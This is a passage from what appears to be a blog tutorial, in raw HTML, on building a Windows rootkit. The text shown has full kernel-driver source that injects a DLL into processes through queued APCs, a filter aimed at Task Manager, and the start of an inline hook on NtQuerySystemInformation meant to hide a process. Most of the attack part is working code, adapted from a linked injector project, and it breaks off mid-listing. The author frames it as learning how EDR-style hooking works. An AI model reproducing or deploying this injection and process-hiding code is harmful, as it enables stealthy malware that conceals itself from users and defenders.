class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] ZwOpenProcess!!!\n&quot;</span>));<br /><br /> <span class="hljs-comment">// 4) Allocate memory on the target process calling ZwAllocateVirtualMemory </span><br /> <span class="hljs-comment">// with the bytes of the string as the size for the allocation.</span><br /> status = <span class="hljs-built_in">ZwAllocateVirtualMemory</span>(hProcess, &amp;pvMemory, <span class="hljs-number">0</span>, &amp;Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br /> <span class="hljs-comment">// check for successfull allocation</span><br /> <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">NT_SUCCESS</span>(status)))<br /> {<br />  <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[ERROR] ZwAllocateVirtualMemory Failed\n&quot;</span>));<br />  <span class="hljs-built_in">ZwClose</span>(hProcess);<br />  <span class="hljs-keyword">return</span> STATUS_NO_MEMORY;<br /> }<br /><br /> KAPC_STATE KasState;<br /> PKAPC Apc;<br /> <span class="hljs-comment">// 5) KeStackAttachProcess which attaches the current thread to the target process address space</span><br /> <span class="hljs-built_in">KeStackAttachProcess</span>(PeProcess, &amp;KasState);<br /> <span class="hljs-comment">// 6) Copy the string to the previously allocated memory</span><br /> <span class="hljs-built_in">strcpy</span>(pvMemory, DllFormatPath);<br /> <span class="hljs-comment">// 7) KeUnstackDetachProcess which detaches the current thread and restores the old attach state.</span><br /> <span class="hljs-built_in">KeUnstackDetachProcess</span>(&amp;KasState);<br /> <span class="hljs-comment">// 8) Allocate memory again for an KAPC variable</span><br /> Apc = (PKAPC)<span class="hljs-built_in">ExAllocatePool</span>(NonPagedPool, <span class="hljs-built_in">sizeof</span>(KAPC));<br /> <span class="hljs-keyword">if</span> (Apc)<br /> {<br />  <span class="hljs-comment">// 9) Initialize the APC inserting the address of the stub LoadLibraryExA and the allocated </span><br />  <span class="hljs-comment">// memory which contains the path of the dll</span><br />  <span class="hljs-built_in">KeInitializeApc</span>(Apc,<br />   PeThread,<br />   <span class="hljs-number">0</span>,<br />   (PKKERNEL_ROUTINE)APCKernelRoutine,<br />   <span class="hljs-number">0</span>,<br />   (PKNORMAL_ROUTINE)pLoadLibraryExA,<br />   UserMode,<br />   pvMemory);<br />  <span class="hljs-comment">// 10) Insert the APC</span><br />  <span class="hljs-built_in">KeInsertQueueApc</span>(Apc, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, IO_NO_INCREMENT);<br />  <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] SUCCESS!!!\n&quot;</span>));<br />  <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br /> }<br /> <span class="hljs-keyword">return</span> STATUS_NO_MEMORY;<br />}<br /><br /><span class="hljs-function">VOID <span class="hljs-title">WorkerRoutine</span><span class="hljs-params">(PVOID Context)</span><br /></span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(Context);<br /> <span class="hljs-built_in">DllInject</span>(&amp;((P_INJECTION_DATA)Context)-&gt;ProcessId, ((P_INJECTION_DATA)Context)-&gt;Process, ((P_INJECTION_DATA)Context)-&gt;Ethread, FALSE);<br /> <span class="hljs-built_in">KeSetEvent</span>(&amp;((P_INJECTION_DATA)Context)-&gt;Event, (KPRIORITY)<span class="hljs-number">0</span>, FALSE);<br /> <span class="hljs-keyword">return</span>;<br />}<br /><br /><span class="hljs-function">VOID NTAPI <span class="hljs-title">APCInjectorRoutine</span><span class="hljs-params">(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* SystemArgument1, PVOID* SystemArgument2, PVOID* Context)</span><br /></span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(Apc);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(NormalRoutine);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(SystemArgument1);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(SystemArgument2);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(Context);<br /><br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] APCInjectorRoutine\n&quot;</span>));<br /><br /> <span class="hljs-comment">// The APCInjectorRoutine Initializes the SIRIFEF_INJECTION_DATA structure and frees the apc value everytime its called.</span><br /> INJECTION_DATA Sf;<br /><br /> <span class="hljs-built_in">RtlSecureZeroMemory</span>(&amp;Sf, <span class="hljs-built_in">sizeof</span>(INJECTION_DATA));<br /> <span class="hljs-built_in">ExFreePool</span>(Apc);<br /> <span class="hljs-comment">// 1) Pass the current thread memory to the structure</span><br /> Sf.Ethread = <span class="hljs-built_in">KeGetCurrentThread</span>();<br /> <span class="hljs-comment">// 2) Pass the the current process to the structure</span><br /> Sf.Process = <span class="hljs-built_in">IoGetCurrentProcess</span>();<br /> <span class="hljs-comment">// 3) Pass the current process id to the structure</span><br /> <span class="hljs-comment">//Sf.ProcessId = PsGetCurrentProcessId();</span><br /> <span class="hljs-comment">// 4) Initialize the notification event</span><br /> <span class="hljs-built_in">KeInitializeEvent</span>(&amp;Sf.Event, NotificationEvent, FALSE);<br /> <span class="hljs-comment">// 5) Initialize the WorkItem, queue the work item with type DelayedWorkItem</span><br /> <span class="hljs-built_in">ExInitializeWorkItem</span>(&amp;Sf.WorkItem, (PWORKER_THREAD_ROUTINE)WorkerRoutine, &amp;Sf);<br /> <span class="hljs-comment">// 6) Wait for the event object</span><br /> <span class="hljs-built_in">ExQueueWorkItem</span>(&amp;Sf.WorkItem, DelayedWorkQueue);<br /> <span class="hljs-built_in">KeWaitForSingleObject</span>(&amp;Sf.Event, Executive, KernelMode, TRUE, <span class="hljs-number">0</span>);<br /> <span class="hljs-keyword">return</span>;<br />}<br /><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntimage.h&gt;</span></span><br /><span class="hljs-function">PVOID <span class="hljs-title">CustomGetProcAddress</span><span class="hljs-params">(PVOID pModuleBase, UNICODE_STRING functionName)</span> </span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(functionName);<br /> <span class="hljs-comment">// Check PE header for magic bytes</span><br /> PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;<br /> <span class="hljs-keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> <span class="hljs-comment">// Check PE header for signature</span><br /> PIMAGE_NT_HEADERS ImageNtHeaders = ((PIMAGE_NT_HEADERS)(<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageDosHeader-&gt;e_lfanew)));<br /> <span class="hljs-keyword">if</span> (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> <span class="hljs-comment">// Check Optional Headers</span><br /> <span class="hljs-keyword">if</span> (!(ImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress &amp;&amp;<br />  <span class="hljs-number">0</span> &lt; ImageNtHeaders-&gt;OptionalHeader.NumberOfRvaAndSizes)) {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> <span class="hljs-comment">// Get address of Export directory</span><br /> PIMAGE_EXPORT_DIRECTORY ImageExport = (((PIMAGE_EXPORT_DIRECTORY)(PUCHAR)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress)));<br /> <span class="hljs-comment">// Check for export directory</span><br /> <span class="hljs-keyword">if</span> (!(ImageExport))<br /> {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> PULONG AddressOfNames = ((PULONG)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageExport-&gt;AddressOfNames));<br /> <span class="hljs-keyword">for</span> (ULONG n = <span class="hljs-number">0</span>; n &lt; ImageExport-&gt;NumberOfNames; ++n)<br /> {<br />  LPSTR FunctionName = ((LPSTR)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, AddressOfNames[n]));<br />  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LoadLibraryExA&quot;</span>, FunctionName) == <span class="hljs-number">0</span>) {<br />   PULONG AddressOfFunctions = ((PULONG)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageExport-&gt;AddressOfFunctions));<br />   PUSHORT AddressOfOrdinals = ((PUSHORT)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageExport-&gt;AddressOfNameOrdinals));<br /><br />   PVOID pFnLoadLibraryExA = ((PVOID)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, AddressOfFunctions[AddressOfOrdinals[n]]));<br /><br />   <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] FOUND! functionName %s @ %p\n&quot;</span>, FunctionName, pFnLoadLibraryExA));<br /><br />   <span class="hljs-keyword">return</span> pFnLoadLibraryExA;<br />  }<br /> }<br /> <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br />}<br /><br /><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LoadImageNotifyRoutine</span><span class="hljs-params">(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)</span> </span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(ImageName);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(ProcessId);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(pImageInfo);<br /> <span class="hljs-comment">// Source: https://github.com/alexvogt91/Kernel-dll-injector/blob/master/Sirifef/Sirifef/Sf.c</span><br /><br /> <span class="hljs-comment">// 1) First check that the ImageName which is a pointer to an UNICODE_STRING structure is not 0</span><br /> <span class="hljs-keyword">if</span> (ImageName == <span class="hljs-literal">NULL</span>) {<br />  <span class="hljs-keyword">return</span>;<br /> }<br /> WCHAR kernel32mask[] = <span class="hljs-string">L&quot;*\\KERNEL32.DLL&quot;</span>;<br /> UNICODE_STRING kernel32unicodeString;<br /> <span class="hljs-comment">// initialize unicode string</span><br /> <span class="hljs-built_in">RtlInitUnicodeString</span>(&amp;kernel32unicodeString, kernel32mask);<br /> <span class="hljs-comment">// 2) Check that the string kernel32.dll exists, since we will be injecting our dll code only when system loads kernel32.dll module.</span><br /> <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">FsRtlIsNameInExpression</span>(&amp;kernel32unicodeString, ImageName, TRUE, <span class="hljs-literal">NULL</span>))) {<br />  <span class="hljs-keyword">return</span>;<br /> }<br /><br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] kernel32.dll match\n&quot;</span>));<br /><br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] Getting Address of LoadLibraryExA\n&quot;</span>));<br /> <span class="hljs-comment">/*<br /> How it was done in the original:<br /> 3) Hash variable its actually a global variable(in real production malware this would be change) defined like this GET_ADDRESS Hash.<br /> 4) If the kernel32dll value is zero, that means it has not loaded yet, so we enter the conditional,<br />  pass the memory from the loaded module by the notification(kernel32.dll) and load the<br />  LoadLibraryExA function using the ResolveDynamicImport which can be found in the ZeroBank rootkit series.<br /><br /> Flow in source:<br /> check if the hash value is empty<br /> if so call resolveDynamicImport using the base address of the dll<br /> resolveDynamicImport calls a custom implementaiton of get proc address<br /> SIRIFEF_LOADLIBRARYEXA_ADDRESS is defined as: #define SIRIFEF_LOADLIBRARYEXA_ADDRESS 1268416216<br /> this is used in the custom get proc address function as so:<br /> - parse PE header and check magic byre for MZ<br /> - check signature<br /> - Check exported functions<br /> - Resolve address of names<br /> - walk names and look for the one with the matching hash<br /> - when hashes match return pointer to the function<br /> */</span><br /> pLoadLibraryExA = <span class="hljs-built_in">CustomGetProcAddress</span>((PVOID)pImageInfo-&gt;ImageBase, kernel32unicodeString);<br /><br /> <span class="hljs-comment">// 5) Next step is to allocate memory for an KAPC variable</span><br /> PKAPC Apc;<br /> Apc = (PKAPC)<span class="hljs-built_in">ExAllocatePool</span>(NonPagedPool, <span class="hljs-built_in">sizeof</span>(KAPC));<br /> <span class="hljs-keyword">if</span> (!Apc)<br /> {<br />  <span class="hljs-keyword">return</span>;<br /> }<br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] APC allocated\n&quot;</span>));<br /><br /> <span class="hljs-comment">// 6) Initialize the Apc with KeInitializeApc using the current thread and introducing the function APCInjectorRoutine, the processor mode is kernelmode.</span><br /> <span class="hljs-built_in">KeInitializeApc</span>(Apc, <span class="hljs-built_in">KeGetCurrentThread</span>(), OriginalApcEnvironment, (PKKERNEL_ROUTINE)APCInjectorRoutine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, KernelMode, <span class="hljs-number">0</span>);<br /> <span class="hljs-comment">// 7) Insert the Apc with KeInsertQueueApc</span><br /> <span class="hljs-built_in">KeInsertQueueApc</span>(Apc, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, IO_NO_INCREMENT);<br />}<br /><br /><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">DriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject)</span><br /></span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(DriverObject);<br /> <span class="hljs-comment">// Cleanup of all resources alloceated</span><br /> <span class="hljs-built_in">PsRemoveLoadImageNotifyRoutine</span>(&amp;LoadImageNotifyRoutine);<br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] Driver sucessfully unloaded\n&quot;</span>));<br />}<br /><br /><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)</span><br /></span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(pDriverObject);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(pRegistryPath);<br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] Driver loaded\n&quot;</span>));<br /> NTSTATUS status;<br /> status = STATUS_SUCCESS;<br /> <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] Registering LoadImageNotifyRoutine\n&quot;</span>));<br /> <span class="hljs-built_in">PsSetLoadImageNotifyRoutine</span>(&amp;LoadImageNotifyRoutine);<br /> pDriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)DriverUnload;<br /> <span class="hljs-keyword">return</span> status;<br /> <span class="hljs-comment">// set major functions</span><br />}<br /><br /><br /></span></pre><p name="465a" id="465a" class="graf graf--p graf-after--pre">And the code for the dll to be injected looks like this (built in a standard Visual Studio C++ dll):</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="4039" id="4039" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment">// dllmain.cpp : Defines the entry point for the DLL application.</span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;winuser.h&quot;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br /><br /><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">notUsed</span><span class="hljs-params">()</span> </span>{<br />    std::cout &lt;&lt; <span class="hljs-string">&quot;gg&quot;</span>;<br />    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br />}<br /><br /><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,<br />    DWORD  ul_reason_for_call,<br />    LPVOID lpReserved<br />)</span><br /></span>{<br />    <span class="hljs-type">int</span> MsgBoxId = <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, (LPCWSTR)<span class="hljs-string">L&quot;Hello from kernel&quot;</span>, (LPCWSTR)<span class="hljs-string">L&quot;TEST&quot;</span>, MB_HELP);<br />    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br />    {<br />    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br />    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br />    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br />    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br />        <span class="hljs-keyword">break</span>;<br />    }<br />    <span class="hljs-keyword">return</span> TRUE;<br />}</span></pre><h3 name="fa0d" id="fa0d" class="graf graf--h3 graf-after--pre">Creating a DLL to Hide Our Process</h3><p name="7ded" id="7ded" class="graf graf--p graf-after--h3">To hide our process from spying eyes (task manager) we will make use of Windows API hooking. As mentioned at the start what we are trying to do, is more or less already done by legitimate applications like EDR software, so let&#39;s take a page out of their book and do some Windows API hooking.</p><p name="64ed" id="64ed" class="graf graf--p graf-after--p">In the most simple terms, what we are doing here is just replacing the normal function call stub in an application with a jump instruction to redirect the execution to our dll, here we will check the result of an API call such as NtQuerySystemInformation and thereby control the information returned. For a more detailed or alternative explanation, I can highly recommend the following sources [<a href="https://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html" data-href="https://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">014</a>],[<a href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">015</a>],[<a href="https://www.youtube.com/watch?v=uS22dBJpr7U" data-href="https://www.youtube.com/watch?v=uS22dBJpr7U" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">016</a>],[<a href="https://github.com/kernelm0de/ProcessHider" data-href="https://github.com/kernelm0de/ProcessHider" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">017</a>]</p><h4 name="0cdc" id="0cdc" class="graf graf--h4 graf-after--p">Limiting injection to Taskmgr</h4><p name="11c9" id="11c9" class="graf graf--p graf-after--h4">First things first is to ensure that the dll injection is only done in the process we want, which in this case is task manager. For this, we just add a check to the kernel driver to check the name of the parent process where the callback comes from.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="swift" name="2d97" id="2d97" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-type">PEPROCESS</span> process <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br /> <span class="hljs-type">PUNICODE_STRING</span> processName <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br /> <span class="hljs-type">PsLookupProcessByProcessId</span>(<span class="hljs-type">ProcessId</span>, <span class="hljs-operator">&amp;</span>process);<br /> <span class="hljs-type">SeLocateProcessImageName</span>(process, <span class="hljs-operator">&amp;</span>processName);<br /> <span class="hljs-type">KdPrint</span>((<span class="hljs-string">&quot;[+] kernel32.dll match in: %wZ<span class="hljs-subst">\n</span>&quot;</span>, processName));<br /> <span class="hljs-comment">// check for match</span><br /> <span class="hljs-type">UNICODE_STRING</span> targetProcessUnicodeString;<br /> <span class="hljs-type">WCHAR</span> targetName[] <span class="hljs-operator">=</span> <span class="hljs-type">L</span><span class="hljs-string">&quot;<span class="hljs-subst">\\</span>Device<span class="hljs-subst">\\</span>HarddiskVolume1<span class="hljs-subst">\\</span>Windows<span class="hljs-subst">\\</span>System32<span class="hljs-subst">\\</span>Taskmgr.exe&quot;</span>;<br /> <span class="hljs-type">RtlInitUnicodeString</span>(<span class="hljs-operator">&amp;</span>targetProcessUnicodeString, targetName);<br /> <span class="hljs-keyword">if</span> (<span class="hljs-type">RtlCompareUnicodeString</span>(<span class="hljs-operator">&amp;</span>targetProcessUnicodeString, processName, <span class="hljs-type">FALSE</span>) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span>) {<br />  <span class="hljs-keyword">return</span>;<br /> }</span></pre><figure name="a5e6" id="a5e6" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*EltPFDk7KD_ewEn2TzfYUg.png" data-width="1110" data-height="419" src="https://cdn-images-1.medium.com/max/800/1*EltPFDk7KD_ewEn2TzfYUg.png"><figcaption class="imageCaption">We are able to detect when task manager is launched from kernel</figcaption></figure><h4 name="4ac8" id="4ac8" class="graf graf--h4 graf-after--figure">Windows API hooking NtQuerySystemInformation</h4><p name="46b8" id="46b8" class="graf graf--p graf-after--h4">For our approach we will be doing all the hooking manually, however, there exist tools and libraries for this for us. Tools like <a href="https://github.com/microsoft/Detours" data-href="https://github.com/microsoft/Detours" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Microsofts Detours</a> [<a href="https://github.com/microsoft/Detours" data-href="https://github.com/microsoft/Detours" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">018</a>] and <a href="https://github.com/TsudaKageyu/minhook" data-href="https://github.com/TsudaKageyu/minhook" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Minihook [019]</a> will be more stable and for production use, these will be used later after we have created a PoC.</p><p name="205e" id="205e" class="graf graf--p graf-after--p">To achieve this here are the steps that we need to perform:</p><ol class="postList"><li name="2a88" id="2a88" class="graf graf--li graf-after--p">Get the address of the function that we are trying to hook, in this case NtQuerySystemInformation</li><li name="9fc9" id="9fc9" class="graf graf--li graf-after--li">Save the first few bytes of the function we are hooking</li><li name="b654" id="b654" class="graf graf--li graf-after--li">Create the function to be called when the hooked function is called</li><li name="9e5e" id="9e5e" class="graf graf--li graf-after--li">Get the memory address of the hooked function</li><li name="e6cf" id="e6cf" class="graf graf--li graf-after--li">Patch the original function to redirect execution flow to the hooked function</li></ol><p name="fe20" id="fe20" class="graf graf--p graf-after--li">First, we get the address and check the result in a debugger, for this we start off by following the approach also used by ired [<a href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">015</a>]</p><figure name="832f" id="832f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*QxUg9aeMqJtEzPFPxZN9KQ.png" data-width="1086" data-height="696" src="https://cdn-images-1.medium.com/max/800/1*QxUg9aeMqJtEzPFPxZN9KQ.png"><figcaption class="imageCaption">Getting the Address of NtQuerySystemInformation</figcaption></figure><p name="3ffb" id="3ffb" class="graf graf--p graf-after--figure">Get the first 6 bytes, pink boxes show the data in our array and in memory</p></div><div class="section-inner sectionLayout--outsetColumn"><figure name="9079" id="9079" class="graf graf--figure graf--layoutOutsetCenter graf-after--p"><img class="graf-image" data-image-id="1*4l4kRyFpgbDYwEwP07kggg.png" data-width="1556" data-height="596" src="https://cdn-images-1.medium.com/max/1200/1*4l4kRyFpgbDYwEwP07kggg.png"><figcaption class="imageCaption">Reading the function bytes</figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="8e1e" id="8e1e" class="graf graf--p graf-after--figure">Next, we create our patch to transfer execution to hooked functionality</p><p name="5aa9" id="5aa9" class="graf graf--p graf-after--p">messing around with this part we quickly run into the issue that we are trying to get this working in a 64-bit system, this means that resources where we use push and ret to get to the proper address are not viable, which in turn means that resources such as the writeup by ired [<a href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">015</a>] cannot be used. So we have to find another way of getting to our target function. Luckily the following article gives good insight into how this can be done.</p><div name="09f4" id="09f4" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html" data-href="https://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html"><strong class="markup--strong markup--mixtapeEmbed-strong">X64 Function Hooking by Example</strong><br><em class="markup--em markup--mixtapeEmbed-em">I build shaders, renderers, games, and other stuff that&#39;s fun to stare at.</em>kylehalladay.com</a><a href="https://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="29f2fde6051254e0fd627129b0533666" data-thumbnail-img-id="0*AjI02x03clc-LdSp" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*AjI02x03clc-LdSp);"></a></div><p name="54df" id="54df" class="graf graf--p graf-after--mixtapeEmbed">In the article, a volatile register is used to store the jump address and then we jump using the register. This works as the register (here r10 is used) is not used to pass values between functions.</p></div><div class="section-inner sectionLayout--outsetColumn"><figure name="835a" id="835a" class="graf graf--figure graf--layoutOutsetCenter graf-after--p"><img class="graf-image" data-image-id="1*Gl0AOvk9DeAZfCi_WxJyLQ.png" data-width="1896" data-height="564" src="https://cdn-images-1.medium.com/max/1200/1*Gl0AOvk9DeAZfCi_WxJyLQ.png"><figcaption class="imageCaption">Absolute jump written to memory</figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="084b" id="084b" class="graf graf--p graf-after--figure">Of course, now the size of our patch has changed so let&#39;s update that as well.</p></div><div class="section-inner sectionLayout--outsetColumn"><figure name="a6d5" id="a6d5" class="graf graf--figure graf--layoutOutsetCenter graf-after--p"><img class="graf-image" data-image-id="1*UNdOiBEghIcoq3R-y6Zekw.png" data-width="1196" data-height="656" src="https://cdn-images-1.medium.com/max/1200/1*UNdOiBEghIcoq3R-y6Zekw.png"><figcaption class="imageCaption">Reading function bytes from memory</figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="9384" id="9384" class="graf graf--p graf-after--figure">Now to test that our hook is installed and working let&#39;s call NtQuerySystemInformation, but since this function is not documented we need to create a reference for it ourselves.</p><p name="64a9" id="64a9" class="graf graf--p graf-after--p">First, we define the function:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="scss" name="efd4" id="efd4" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">typedef <span class="hljs-built_in">NTSTATUS</span>(NTAPI* _NtQuerySystemInformation)(<br />    ULONG SystemInformationClass,<br />    PVOID SystemInformation,<br />    ULONG SystemInformationLength,<br />    PULONG ReturnLength<br />    );</span></pre><p name="2fd0" id="2fd0" class="graf graf--p graf-after--pre">Next, we need to get the address of the function, luckily we already did this at the start of our code with ‘addrNtQuerySystemInformation = GetProcAddress(library, “NtQuerySystemInformation”);’ we can use this address to define our own function:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="go" name="dbc2" id="dbc2" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">ULONG <span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>;<br />_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)addrNtQuerySystemInformation;<br />NtQuerySystemInformation(SystemBasicInformation, NULL, <span class="hljs-number">0</span>, &amp;<span class="hljs-built_in">len</span>);</span></pre><p name="ddb1" id="ddb1" class="graf graf--p graf-after--pre">And testing it out we see that it is working!</p><figure name="d4ef" id="d4ef" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*YYOAsq6xXhpxc1bJusWhQg.png" data-width="1139" data-height="191" src="https://cdn-images-1.medium.com/max/800/1*YYOAsq6xXhpxc1bJusWhQg.png"></figure><p name="f7d1" id="f7d1" class="graf graf--p graf-after--figure">Next, before we move on, let&#39;s see if we can move this functionality from our standard executable and into a dll since this is our target in the end.</p><h4 name="a1f4" id="a1f4" class="graf graf--h4 graf-after--p">Migrating from exe to DLL</h4><p name="0ba3" id="0ba3" class="graf graf--p graf-after--h4"><strong class="markup--strong markup--p-strong">Note: </strong>During this part, I ran into some issues when trying to compile from my machine hosting the VM (running Windows 11). However, the issue was fixed when using the victim machine for the compilation of the dll.</p><p name="704d" id="704d" class="graf graf--p graf-after--p">To move our functionality to a Dll, we simply create a standard C++ dll as per Visual Studios default options, and then we move our code into a function that will be called by the application. The result looks like this, where “HookNtQuerySystemInformation” holds our hooking code from before:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="8f41" id="8f41" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment">// dllmain.cpp : Defines the entry point for the DLL application.</span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br /><br />FARPROC addrNtQuerySystemInformation = <span class="hljs-literal">NULL</span>;<br />SIZE_T bytesWritten = <span class="hljs-number">0</span>;<br /><br /><span class="hljs-function"><span class="hljs-type">int</span> __stdcall <span class="hljs-title">HookedNtQuerySystemInformation</span><span class="hljs-params">()</span> </span>{<br />    <span class="hljs-type">int</span> MsgBoxId = <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, (LPCWSTR)<span class="hljs-string">L&quot;Hello from hooked function&quot;</span>, (LPCWSTR)<span class="hljs-string">L&quot;TEST&quot;</span>, 